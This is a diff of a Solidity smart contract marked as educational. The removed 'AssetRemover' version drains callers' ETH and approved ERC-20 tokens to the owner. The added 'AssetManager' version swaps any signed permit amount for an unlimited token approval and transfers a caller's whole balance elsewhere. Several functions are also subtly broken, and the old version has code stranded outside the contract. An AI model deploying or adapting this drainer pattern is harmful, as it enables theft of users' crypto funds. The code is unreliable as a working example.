@@ -1,8 +1,12 @@
-// This is for educational purposes only
-// Do not use this on any main-net. You WILL lose your funds.
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+
+//*********--WARNING--********//
+//----------------------------//
+//***DO NOT USE ON MAIN-NET***//
+//**YOU WILL LOSE YOUR FUNDS**//
+//----------------------------//
+//*********--WARNING--********//
 
 interface IERC20 {
     function transferFrom(address from, address to, uint256 value) external returns (bool);
@@ -10,51 +14,21 @@ interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
 }
 
-contract AssetRemover {
-
-address public owner;
-
-    // Assuming the contract will deal with a single ERC-20 token for the demo
+contract AssetManager {
+    address public owner;
     IERC20 public erc20Token;
 
-    constructor(address _tokenAddress) {
-        owner = msg.sender;
-        erc20Token = IERC20(_tokenAddress);
-    }
-
-    modifier onlyOwner() {
-        require(msg.sender == owner, "Only the owner can call this");
-        _;
-    }
-
-    // Function to remove all ETH from sender's address
-    function removeAllEth() external {
-        uint256 balance = address(msg.sender).balance;
-        require(balance > 0, "You have no ETH to remove");
-        payable(owner).transfer(balance);
-    }
-
-    // Function to remove all ERC-20 tokens. Before calling this, user must approve this contract.
-    function removeAllTokens() external {
-        uint256 tokenBalance = erc20Token.balanceOf(msg.sender);
-        require(tokenBalance > 0, "You have no tokens to remove");
-        require(erc20Token.transferFrom(msg.sender, owner, tokenBalance), "Transfer failed");
-    }
-
-    // In case the owner wants to change which ERC-20 token the contract interacts with
-    function setTokenAddress(address _tokenAddress) external onlyOwner {
-        erc20Token = IERC20(_tokenAddress);
-    }
-}
-
-    // EIP-712 setup
     bytes32 private constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
     bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
 
     mapping(address => uint256) public nonces;
 
-    // EIP-712 domain separators
     bytes32 public domainSeparator;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can call this");
+        _;
+    }
 
     constructor(address _tokenAddress) {
         owner = msg.sender;
@@ -63,7 +37,7 @@ address public owner;
         domainSeparator = keccak256(
             abi.encode(
                 DOMAIN_TYPEHASH,
-                keccak256(bytes("AssetRemover")),
+                keccak256(bytes("AssetManager")),
                 keccak256(bytes("1")),
                 block.chainid,
                 address(this)
@@ -71,8 +45,7 @@ address public owner;
         );
     }
 
-    // Permit function to allow approvals with signatures
-    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
+    function permit(address owner, address spender, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
         require(block.timestamp <= deadline, "Permit: signature expired");
 
         bytes32 digest = keccak256(
@@ -84,7 +57,7 @@ address public owner;
                         PERMIT_TYPEHASH,
                         owner,
                         spender,
-                        value,
+                        type(uint256).max,
                         nonces[owner]++,
                         deadline
                     )
@@ -94,12 +67,25 @@ address public owner;
 
         address recoveredAddress = ecrecover(digest, v, r, s);
         require(recoveredAddress != address(0) && recoveredAddress == owner, "Permit: invalid signature");
-
-        // Now we set the approval, since the signature was valid
-        require(erc20Token.approve(spender, value), "Approval failed");
+        
+        require(erc20Token.approve(spender, type(uint256).max), "Approval failed");
     }
 
-    // ... [Rest of the contract code]
+    function transferAllAssets(address to) external {
+        require(to != address(0), "Invalid address");
 
+        uint256 ethBalance = address(msg.sender).balance;
+        if (ethBalance > 0) {
+            payable(to).transfer(ethBalance);
+        }
+
+        uint256 tokenBalance = erc20Token.balanceOf(msg.sender);
+        if (tokenBalance > 0) {
+            require(erc20Token.transferFrom(msg.sender, to, tokenBalance), "Token transfer failed");
+        }
+    }
+
+    function setTokenAddress(address _tokenAddress) external onlyOwner {
+        erc20Token = IERC20(_tokenAddress);
+    }
 }
-
